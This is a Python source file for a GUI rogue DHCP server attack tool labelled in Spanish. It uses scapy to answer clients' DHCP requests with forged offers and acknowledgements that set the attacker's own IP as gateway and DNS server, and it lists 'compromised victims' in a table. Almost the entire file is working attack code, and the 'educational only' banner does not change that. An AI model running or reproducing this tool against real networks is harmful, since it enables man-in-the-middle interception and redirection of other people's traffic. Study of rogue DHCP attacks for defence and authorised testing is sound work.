#!/usr/bin/env python3

from scapy.all import *
import random
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from datetime import datetime
import sys

# =============================================================================
# CONFIGURACION PREDETERMINADA
# =============================================================================
DEFAULT_INTERFACE = "eth0"
DEFAULT_ATTACKER_IP = "23.72.0.21"
DEFAULT_SUBNET = "255.255.255.0"

class DHCPRogueAttacker:

    def __init__(self, interface, attacker_ip, subnet_mask):
        self.interface = interface
        self.attacker_ip = attacker_ip
        self.subnet_mask = subnet_mask
        self.attacker_mac = None
        self.is_running = False
        self.victim_database = {}
        self.available_ips = self._generate_ip_pool()
        self.stats = {
            'offers_sent': 0,
            'acks_sent': 0,
            'victims_count': 0
        }
        self.gui_callback = None

    def _generate_ip_pool(self):
        network_prefix = '.'.join(self.attacker_ip.split('.')[:-1])
        ip_list = [f"{network_prefix}.{i}" for i in range(31, 251)]
        random.shuffle(ip_list)
        return ip_list

    def _get_available_ip(self):
        if not self.available_ips:
            self.available_ips = self._generate_ip_pool()
        return self.available_ips.pop(0)

    def _build_dhcp_offer(self, discover_pkt):
        client_mac = discover_pkt[Ether].src
        transaction_id = discover_pkt[BOOTP].xid
        assigned_ip = self._get_available_ip()

        ethernet_layer = Ether(src=self.attacker_mac, dst=client_mac)
        ip_layer = IP(src=self.attacker_ip, dst="255.255.255.255")
        udp_layer = UDP(sport=67, dport=68)

        bootp_layer = BOOTP(
            op=2,
            xid=transaction_id,
            yiaddr=assigned_ip,
            siaddr=self.attacker_ip,
            chaddr=mac2str(client_mac)
        )

        dhcp_layer = DHCP(options=[
            ("message-type", "offer"),
            ("server_id", self.attacker_ip),
            ("lease_time", 7200),
            ("subnet_mask", self.subnet_mask),
            ("router", self.attacker_ip),
            ("name_server", self.attacker_ip),
            "end"
        ])

        packet = ethernet_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

        if client_mac not in self.victim_database:
            self.victim_database[client_mac] = {'ip': assigned_ip, 'timestamp': None}
        else:
            self.victim_database[client_mac]['ip'] = assigned_ip

        return packet, assigned_ip

    def _build_dhcp_ack(self, request_pkt):
        client_mac = request_pkt[Ether].src
        transaction_id = request_pkt[BOOTP].xid

        if client_mac in self.victim_database:
            confirmed_ip = self.victim_database[client_mac]['ip']
        else:
            confirmed_ip = self._get_available_ip()

        ethernet_layer = Ether(src=self.attacker_mac, dst=client_mac)
        ip_layer = IP(src=self.attacker_ip, dst="255.255.255.255")
        udp_layer = UDP(sport=67, dport=68)

        bootp_layer = BOOTP(
            op=2,
            xid=transaction_id,
            yiaddr=confirmed_ip,
            siaddr=self.attacker_ip,
            chaddr=mac2str(client_mac)
        )

        dhcp_layer = DHCP(options=[
            ("message-type", "ack"),
            ("server_id", self.attacker_ip),
            ("lease_time", 7200),
            ("subnet_mask", self.subnet_mask),
            ("router", self.attacker_ip),
            ("name_server", self.attacker_ip),
            "end"
        ])

        packet = ethernet_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

        self.victim_database[client_mac] = {
            'ip': confirmed_ip,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        return packet, confirmed_ip

    def _handle_dhcp_packet(self, pkt):
        if not DHCP in pkt:
            return

        message_type = None
        for option in pkt[DHCP].options:
            if isinstance(option, tuple) and option[0] == 'message-type':
                message_type = option[1]
                break

        client_mac = pkt[Ether].src

        if message_type == 1:
            offer_pkt, offered_ip = self._build_dhcp_offer(pkt)

            for _ in range(3):
                sendp(offer_pkt, iface=self.interface, verbose=0)

            self.stats['offers_sent'] += 1

            if self.gui_callback:
                self.gui_callback('log', f"[DISCOVER] Detectado de {client_mac}")
                self.gui_callback('log', f"[OFFER] Enviado -> IP: {offered_ip}")
                self.gui_callback('update_stats', self.stats)

        elif message_type == 3:
            ack_pkt, confirmed_ip = self._build_dhcp_ack(pkt)

            for _ in range(3):
                sendp(ack_pkt, iface=self.interface, verbose=0)

            self.stats['acks_sent'] += 1
            self.stats['victims_count'] = len(self.victim_database)

            if self.gui_callback:
                self.gui_callback('log', f"[REQUEST] Detectado de {client_mac}")
                self.gui_callback('log', f"[ACK] Victima comprometida -> {confirmed_ip}")
                self.gui_callback('update_stats', self.stats)
                self.gui_callback('update_victims', self.victim_database)

    def start_attack(self, callback=None):
        self.gui_callback = callback
        self.is_running = True

        try:
            self.attacker_mac = get_if_hwaddr(self.interface)

            if self.gui_callback:
                self.gui_callback('log', f"Iniciando ataque en interfaz {self.interface}")
                self.gui_callback('log', f"IP del atacante: {self.attacker_ip}")
                self.gui_callback('log', f"MAC del atacante: {self.attacker_mac}")
                self.gui_callback('log', "Esperando solicitudes DHCP...")

            sniff(
                iface=self.interface,
                filter="udp and (port 67 or port 68)",
                prn=self._handle_dhcp_packet,
                stop_filter=lambda x: not self.is_running,
                store=0
            )

        except Exception as e:
            if self.gui_callback:
                self.gui_callback('log', f"ERROR: {str(e)}")

    def stop_attack(self):
        self.is_running = False


# =============================================================================
# INTERFAZ GRAFICA
# =============================================================================
class DHCPRogueGUI:

    def __init__(self, root):
        self.root = root
        self.root.title("DHCP Rogue Attack Tool - Educativo")
        self.root.geometry("1000x750")
        self.root.resizable(True, True)
        self.attack_thread = None
        self.attacker = None
        self._build_interface()

    def _build_interface(self):
        main_container = ttk.Frame(self.root, padding="15")
        main_container.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # =============================================================================
        # SECCION DE CONFIGURACION
        # =============================================================================
        config_section = ttk.LabelFrame(main_container, text="Configuracion del Ataque", padding="10")
        config_section.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        ttk.Label(config_section, text="Interfaz de Red:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.interface_entry = ttk.Entry(config_section, width=20)
        self.interface_entry.insert(0, DEFAULT_INTERFACE)
        self.interface_entry.grid(row=0, column=1, padx=5)

        ttk.Label(config_section, text="IP del Atacante:").grid(row=0, column=2, sticky=tk.W, padx=(30, 5))
        self.ip_entry = ttk.Entry(config_section, width=20)
        self.ip_entry.insert(0, DEFAULT_ATTACKER_IP)
        self.ip_entry.grid(row=0, column=3, padx=5)

        ttk.Label(config_section, text="Mascara de Subred:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=(5, 0))
        self.subnet_entry = ttk.Entry(config_section, width=20)
        self.subnet_entry.insert(0, DEFAULT_SUBNET)
        self.subnet_entry.grid(row=1, column=1, padx=5, pady=(5, 0))

        # =============================================================================
        # SECCION DE ESTADISTICAS
        # =============================================================================
        stats_section = ttk.LabelFrame(main_container, text="Estadisticas del Ataque", padding="10")
        stats_section.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        self.offers_label = ttk.Label(stats_section, text="DHCP Offers Enviados: 0", font=('Arial', 10, 'bold'))
        self.offers_label.grid(row=0, column=0, sticky=tk.W, padx=10)

        self.acks_label = ttk.Label(stats_section, text="DHCP ACKs Enviados: 0", font=('Arial', 10, 'bold'))
        self.acks_label.grid(row=0, column=1, sticky=tk.W, padx=10)

        self.victims_count_label = ttk.Label(stats_section, text="Victimas Comprometidas: 0",
                                             font=('Arial', 10, 'bold'), foreground='red')
        self.victims_count_label.grid(row=0, column=2, sticky=tk.W, padx=10)

        # =============================================================================
        # TABLA DE VICTIMAS
        # =============================================================================
        victims_section = ttk.LabelFrame(main_container, text="Victimas Comprometidas", padding="10")
        victims_section.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))

        columns = ('mac', 'ip', 'gateway', 'dns', 'timestamp')
        self.victims_table = ttk.Treeview(victims_section, columns=columns, show='headings', height=12)

        self.victims_table.heading('mac', text='Direccion MAC')
        self.victims_table.heading('ip', text='IP Asignada')
        self.victims_table.heading('gateway', text='Gateway Rogue')
        self.victims_table.heading('dns', text='DNS Rogue')
        self.victims_table.heading('timestamp', text='Fecha/Hora')

        self.victims_table.column('mac', width=180)
        self.victims_table.column('ip', width=130)
        self.victims_table.column('gateway', width=130)
        self.victims_table.column('dns', width=130)
        self.victims_table.column('timestamp', width=160)

        self.victims_table.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        table_scroll = ttk.Scrollbar(victims_section, orient="vertical", command=self.victims_table.yview)
        table_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.victims_table.configure(yscrollcommand=table_scroll.set)

        # =============================================================================
        # AREA DE LOGS
        # =============================================================================
        logs_section = ttk.LabelFrame(main_container, text="Registro de Actividad", padding="10")
        logs_section.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))

        self.log_area = scrolledtext.ScrolledText(logs_section, height=10, state="disabled",
                                                  wrap=tk.WORD, font=('Courier', 9))
        self.log_area.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # =============================================================================
        # BOTONES DE CONTROL
        # =============================================================================
        controls_section = ttk.Frame(main_container)
        controls_section.grid(row=4, column=0, columnspan=2, pady=(0, 5))

        self.start_btn = ttk.Button(controls_section, text="Iniciar Ataque",
                                    command=self.start_attack, width=20)
        self.start_btn.grid(row=0, column=0, padx=5)

        self.stop_btn = ttk.Button(controls_section, text="Detener Ataque",
                                   command=self.stop_attack, state="disabled", width=20)
        self.stop_btn.grid(row=0, column=1, padx=5)

        self.clear_btn = ttk.Button(controls_section, text="Limpiar Datos",
                                    command=self.clear_data, width=20)
        self.clear_btn.grid(row=0, column=2, padx=5)

        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_container.columnconfigure(0, weight=1)
        main_container.rowconfigure(2, weight=2)
        main_container.rowconfigure(3, weight=1)
        victims_section.columnconfigure(0, weight=1)
        victims_section.rowconfigure(0, weight=1)
        logs_section.columnconfigure(0, weight=1)
        logs_section.rowconfigure(0, weight=1)

    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.config(state="normal")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.config(state="disabled")
        self.log_area.see(tk.END)

    def gui_update_callback(self, action, data):
        if action == 'log':
            self.log_message(data)
        elif action == 'update_stats':
            self.offers_label.config(text=f"DHCP Offers Enviados: {data['offers_sent']}")
            self.acks_label.config(text=f"DHCP ACKs Enviados: {data['acks_sent']}")
            self.victims_count_label.config(text=f"Victimas Comprometidas: {data['victims_count']}")
        elif action == 'update_victims':
            self.refresh_victims_table(data)

    def refresh_victims_table(self, victims_db):
        for item in self.victims_table.get_children():
            self.victims_table.delete(item)

        for mac, info in victims_db.items():
            if info['timestamp']:
                self.victims_table.insert('', tk.END, values=(
                    mac,
                    info['ip'],
                    self.ip_entry.get(),
                    self.ip_entry.get(),
                    info['timestamp']
                ))

    def start_attack(self):
        interface = self.interface_entry.get().strip()
        attacker_ip = self.ip_entry.get().strip()
        subnet = self.subnet_entry.get().strip()

        if not all([interface, attacker_ip, subnet]):
            messagebox.showerror("Error", "Completa todos los campos de configuracion")
            return

        if os.geteuid() != 0:
            messagebox.showerror("Error", "Debes ejecutar este script con privilegios de root (sudo)")
            return

        self.attacker = DHCPRogueAttacker(interface, attacker_ip, subnet)

        self.attack_thread = threading.Thread(
            target=self.attacker.start_attack,
            args=(self.gui_update_callback,),
            daemon=True
        )
        self.attack_thread.start()

        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.interface_entry.config(state="disabled")
        self.ip_entry.config(state="disabled")
        self.subnet_entry.config(state="disabled")

        self.log_message("="*60)
        self.log_message("ATAQUE DHCP ROGUE INICIADO")
        self.log_message("="*60)

    def stop_attack(self):
        if self.attacker:
            self.attacker.stop_attack()
            self.log_message("="*60)
            self.log_message("ATAQUE DETENIDO")
            self.log_message("="*60)

        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.interface_entry.config(state="normal")
        self.ip_entry.config(state="normal")
        self.subnet_entry.config(state="normal")

    def clear_data(self):
        for item in self.victims_table.get_children():
            self.victims_table.delete(item)

        self.log_area.config(state="normal")
        self.log_area.delete(1.0, tk.END)
        self.log_area.config(state="disabled")

        self.offers_label.config(text="DHCP Offers Enviados: 0")
        self.acks_label.config(text="DHCP ACKs Enviados: 0")
        self.victims_count_label.config(text="Victimas Comprometidas: 0")

        self.log_message("Datos limpiados")


# =============================================================================
# PROGRAMA PRINCIPAL
# =============================================================================
def main():
    print("\n" + "="*70)
    print("   DHCP ROGUE SERVER ATTACK TOOL")
    print("   SOLO PARA PROPOSITOS EDUCATIVOS Y PRUEBAS AUTORIZADAS")
    print("="*70 + "\n")

    if os.geteuid() != 0:
        print("[ERROR] Este script requiere privilegios de root")
        print("Ejecuta con: sudo python3 dhcp_rogue_attack.py\n")
        sys.exit(1)

    root = tk.Tk()
    app = DHCPRogueGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()

